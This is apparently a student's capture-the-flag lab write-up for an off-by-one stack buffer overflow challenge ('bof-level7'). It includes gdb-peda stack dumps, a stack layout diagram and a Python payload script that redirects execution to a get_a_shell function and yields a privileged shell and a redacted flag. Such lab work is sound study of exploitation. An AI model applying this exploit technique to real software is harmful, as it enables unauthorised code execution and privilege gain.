------------------------
 bof-level7_
------------------------
1. 
use info function find get_a_shell
#0x080484fb  get_a_shell
2.
find the buffer start by used
$ gdb ./bof-level7 
Reading symbols from ./bof-level7...(no debugging symbols found)...done.
gdb-peda$ b *receive_input +99
Breakpoint 1 at 0x80485ab
gdb-peda$ r
Starting program: /home/users/nintyfour/week2/bof-level7/bof-level7 
Now, the developer is trained a bit more, however,
still the vulnerability exists. 1-byte overflow in the buffer,
which is off-by-one vulnerability!
Can you exploit this program?
1234 

[----------------------------------registers-----------------------------------]
EAX: 0x89 
EBX: 0x0 
ECX: 0x0 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1b1db0 
EDI: 0xf7fb4000 --> 0x1b1db0 
EBP: 0xffffd508 --> 0xffffd500 --> 0x0 
ESP: 0xffffd480 ("1234\n")
EIP: 0x80485ab (<receive_input+99>:	leave)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485a3 <receive_input+91>:	cmp    $0x88,%eax
   0x80485a8 <receive_input+96>:	jle    0x8048578 <receive_input+48>
   0x80485aa <receive_input+98>:	nop
=> 0x80485ab <receive_input+99>:	leave  
   0x80485ac <receive_input+100>:	ret    
   0x80485ad <run>:	push   %ebp
   0x80485ae <run+1>:	mov    %esp,%ebp
   0x80485b0 <run+3>:	sub    $0x8,%esp
[------------------------------------stack-------------------------------------]
0000| 0xffffd480 ("1234\n")
0004| 0xffffd484 --> 0xa ('\n')
0008| 0xffffd488 --> 0x0 
0012| 0xffffd48c --> 0x0 
0016| 0xffffd490 --> 0x0 
0020| 0xffffd494 --> 0x0 
0024| 0xffffd498 --> 0x0 
0028| 0xffffd49c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080485ab in receive_input ()
x/100w $esp-0x100
0xffffd408:	0x00000000	0xf7e6b0b1	0x00000001	0x0804b008
0xffffd418:	0x0000001e	0xf7e601ed	0xf7fb45a0	0x0804a060
0xffffd428:	0x000000ff	0x0000000a	0x00000001	0xf7e091a8
0xffffd438:	0xffffd4f8	0xf7e6a3e4	0xf7fe77eb	0x00000000
0xffffd448:	0xf7e01700	0x00000000	0xffffd508	0xf7fee010
0xffffd458:	0xf7e6015b	0x00000000	0xf7fb4000	0xf7fb4000
0xffffd468:	0xffffd508	0x08048569	0x0804a060	0x00000100
0xffffd478:	0xf7fb45a0	0xf7e6c47b	0x34333231	0x0000000a<-here
0xffffd488:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd498:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd4a8:	0x00000000	0x00000000	0x00000000	0x00000000
3. 
judge how many buffer is there

                                     _4 bytes  ________4bytes_____
				    /	     |/ 	          \		
[      buffer                  ][1][saved ebp][ret_addr in receive]
|                                  |
0                                 129 
 \________________________136____________________________________/

so we need to return to run then, go to get_a_shell function

4.
write python
#0xffffd480

#!/usr/bin/env python
with open('input.txt','wb') as f:
    f.write("xxxx"+"\xfb\x84\x04\x08" + "aaaa" * (128/4-2)+"bbbbbbbb"+"\x80\xd4\xff\xff")
5.
xxd input.txt
then
nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level7
$ (cat input.txt;cat) | ./bof-level7
Now, the developer is trained a bit more, however,
still the vulnerability exists. 1-byte overflow in the buffer,
which is off-by-one vulnerability!
Can you exploit this program?


Segmentation fault (core dumped)

nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level7
$ gdb --core=core
[New LWP 6911]

warning: Unexpected size of section `.reg-xstate/6911' in core file.
Core was generated by `./bof-level7'.
Program terminated with signal SIGSEGV, Segmentation fault.

warning: Unexpected size of section `.reg-xstate/6911' in core file.
#0  0x61616161 in ?? ()
gdb-peda$ x/100wx $esp-0x100
0xffffd388:	0x0000008b	0xffffd408	0x00000016	0x0804a0ec
0xffffd398:	0xf7fb4000	0x0000001f	0x00002190	0x00000001
0xffffd3a8:	0xf7e611f9	0xf7fb4000	0xf7fb45a0	0x00000000
0xffffd3b8:	0xffffd438	0xf7e613ce	0xf7fb45a0	0x0804a060
0xffffd3c8:	0x000000ff	0x0000000a	0x00000001	0x00000000
0xffffd3d8:	0x00000000	0xf7e6b0b1	0x00000001	0x0804b008
0xffffd3e8:	0x0000001e	0xf7e601ed	0xf7fb45a0	0x0804a060
0xffffd3f8:	0x000000ff	0x0000000a	0x00000001	0xf7e091a8
0xffffd408:	0xffffd4c8	0xf7e6a3e4	0xf7fe77eb	0x00000000
0xffffd418:	0xf7e01700	0x00000000	0xffffd4d8	0xf7fee010
0xffffd428:	0xf7e6015b	0x00000000	0xf7fb4000	0xf7fb4000
0xffffd438:	0xffffd4d8	0x08048569	0x0804a060	0x00000100
0xffffd448:	0xf7fb45a0	0xf7e6c47b	0x78787878	0x080484fb<---here
0xffffd458:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd468:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd478:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd488:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd498:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4a8:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4b8:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd4c8:	0x61616161	0x61616161	0x62626262	0x62626262
0xffffd4d8:	0xffffd480	0x080485f8	0x00000001	0xffffd5a4
0xffffd4e8:	0xffffd4f8	0x08048611	0xf7fb43dc	0xffffd510
0xffffd4f8:	0x00000000	0xf7e1a637	0xf7fb4000	0xf7fb4000
0xffffd508:	0x00000000	0xf7e1a637	0x00000001	0xffffd5a4
gdb-peda$ q

6.
 amended python code
  1 #0x080484fb  get_a_shell                                                         
  2                                                                                  
  3 #0xffffd480                                                                      
  4                                                                                  
  5
  6 #0xffffd448: 0xf7fb45a0  0xf7e6c47b  0x78787878  0x080484fb                      
  7 #!/usr/bin/env python                                                            
  8 with open('input.txt','wb') as f:                                                
  9     f.write("xxxx"+"\xfb\x84\x04\x08" + "aaaa" * (128/4-2)+"bbbbbbbb"+"\x50")  
                                                                                     
7.

nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level7
$ python level7.py 

nintyfour@blue9057-vm-ctf1 : ~/week2/bof-level7
$ (cat input.txt;cat) | ./bof-level7
Now, the developer is trained a bit more, however,
still the vulnerability exists. 1-byte overflow in the buffer,
which is off-by-one vulnerability!
Can you exploit this program?

Spawning a privileged shell

cat flag
cs519{XXXXXXXXXXXXXXXXXXXXX}

        
